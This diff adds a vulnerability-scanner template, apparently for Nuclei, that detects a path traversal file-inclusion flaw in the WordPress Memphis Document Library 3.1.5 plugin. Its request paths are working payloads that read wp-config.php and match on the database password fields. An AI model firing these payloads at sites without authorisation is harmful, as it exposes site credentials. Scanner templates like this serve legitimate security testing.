@@ -1,0 +1,37 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - DB_NAME
+            - DB_PASSWORD
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/mdocs-posts/?mdocs-img-preview=../../../wp-config.php'
+        - '{{BaseURL}}/?mdocs-img-preview=../../../wp-config.php'
+id: wp-memphis-documents-library-lfi
+info:
+    author: 0x_Akoko
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: WordPress Memphis Document Library 3.1.5 is vulnerable to local file inclusion.
+    metadata:
+        max-request: 2
+    name: WordPress Memphis Document Library 3.1.5 - Local File Inclusion
+    reference:
+        - https://www.exploit-db.com/exploits/39593
+        - https://wpscan.com/vulnerability/53999c06-05ca-44f1-b713-1e4d6b4a3f9f
+    severity: high
+    tags:
+        - wpscan
+        - wordpress
+        - wp-plugin
+        - edb
+        - WordPress
